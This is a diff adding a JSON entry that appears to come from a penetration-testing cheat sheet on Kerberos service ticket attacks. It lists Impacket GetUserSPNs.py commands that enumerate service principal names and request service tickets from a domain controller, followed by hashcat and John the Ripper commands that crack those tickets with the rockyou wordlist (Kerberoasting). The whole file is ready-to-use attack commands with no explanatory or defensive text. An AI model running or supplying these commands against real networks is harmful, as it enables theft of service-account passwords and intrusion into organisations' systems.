@@ -1,0 +1,57 @@
+{
+    "topicId": 5,
+    "topicTitle": "Service Ticket Attack",
+    "topicDescription": "",
+    "commands": [
+        {
+            "commandId": "5.1",
+            "commandTitle": "Listing Service Principal Names (SPN)",
+            "commandDescription": "",
+            "linuxCommands": [
+                {
+                    "commandList": [
+                        "GetUserSPNs.py -dc-ip {DC_IP} {DOMAIN}/{USER}",
+                        "GetUserSPNs.py -dc-ip {DC_IP} {DOMAIN}/{USER} -request-user 'spn_name' -outputfile 'spn_name_st.txt'",
+                        "GetUserSPNs.py -dc-ip {DC_IP} {DOMAIN}/{USER} -request"
+                    ],
+                    "commandGroupDescription": ""
+                }
+            ],
+            "windowsCommands": [
+                {
+                    "commandList": [
+                        ""
+                    ],
+                    "commandGroupDescription": ""
+                }
+            ]
+        },
+        {
+            "commandId": "5.2",
+            "commandTitle": "Cracking service ticket (Kerberoasting)",
+            "commandDescription": "",
+            "linuxCommands": [
+                {
+                    "commandList": [
+                        "hashcat -m 13100 spn_name_st.txt /usr/share/wordlists/rockyou.txt"
+                    ],
+                    "commandGroupDescription": ""
+                },
+                {
+                    "commandList": [
+                        "john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt spn_name_st.txt"
+                    ],
+                    "commandGroupDescription": ""
+                }
+            ],
+            "windowsCommands": [
+                {
+                    "commandList": [
+                        ""
+                    ],
+                    "commandGroupDescription": ""
+                }
+            ]
+        }
+    ]
+}
